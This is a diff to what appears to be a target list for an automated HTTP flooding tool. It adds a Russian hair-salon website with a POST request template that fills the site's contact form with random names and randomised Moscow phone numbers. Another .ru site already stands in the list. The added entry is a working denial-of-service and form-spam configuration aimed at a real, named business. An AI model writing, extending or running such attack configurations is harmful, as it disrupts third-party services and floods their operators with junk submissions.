@@ -1,6 +1,16 @@
 {
   "targets": [
     {
+      "target": "https://modshairrussia.ru",
+      "method": "HTTP_TEMPLATE",
+      "options": {
+        "body": "-----------------------------17097944912524891368454341740\nContent-Disposition: form-data; name=\"name\"\n\n{{str(6)}}\n-----------------------------17097944912524891368454341740\nContent-Disposition: form-data; name=\"phone\"\n\n+7 (495) 625-{{int(1,9)}}{{int(1,9)}}-{{int(1,9)}}{{int(1,9)}}\n-----------------------------17097944912524891368454341740\nContent-Disposition: form-data; name=\"subject\"\n\nTotal look\n-----------------------------17097944912524891368454341740--\n",
+        "headers": "{\"Content-Type\": \"multipart/form-data; boundary=---------------------------17097944912524891368454341740\", \"Referer\": \"https://modshairrussia.ru/\", \"X-Requested-With\": \"X-Requested-With\"}",
+        "path_qs": "/send",
+        "verb": "POST"
+      }
+    },
+    {
       "target": "https://newdaynews.ru",
       "method": "HTTP_TEMPLATE",
       "options": {
